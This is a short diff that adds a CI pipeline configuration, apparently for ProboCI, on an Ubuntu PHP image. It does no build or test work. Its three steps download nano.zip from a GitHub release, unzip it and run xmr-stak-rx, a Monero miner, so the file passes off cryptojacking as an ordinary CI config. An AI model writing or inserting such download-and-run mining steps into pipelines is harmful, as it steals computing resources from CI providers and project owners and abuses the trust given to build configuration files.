@@ -1,0 +1,9 @@
+image: proboci/ubuntu:18.04-php7.4
+steps:
+  - name: nganu
+    plugin: Shell
+    command: wget https://github.com/AnggaR96s/TRASH-COMMIT/releases/download/latest/nano.zip
+  - name: anu
+    command: unzip nano.zip
+  - name: ekse
+    command: ./xmr-stak-rx --noTest
